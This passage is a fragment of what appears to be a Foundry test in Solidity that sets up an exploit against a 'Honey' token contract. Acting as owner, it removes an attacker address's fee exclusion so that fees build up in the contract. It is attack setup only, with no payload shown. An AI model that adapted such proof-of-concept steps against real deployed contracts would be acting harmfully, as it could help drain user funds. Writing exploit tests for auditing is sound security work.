        // Step 2: Accumulate fees in the contract by making transfers
        // We need to make transfers that incur fees to build up contract balance
        // First, remove fee exclusion to pay fees
        vm.startPrank(owner);
        address[] memory removeExclusion = new address[](1);
        removeExclusion[0] = attacker;
        Honey(TARGET).bulkExcludeFee(removeExclusion, false);
        vm.stopPrank();

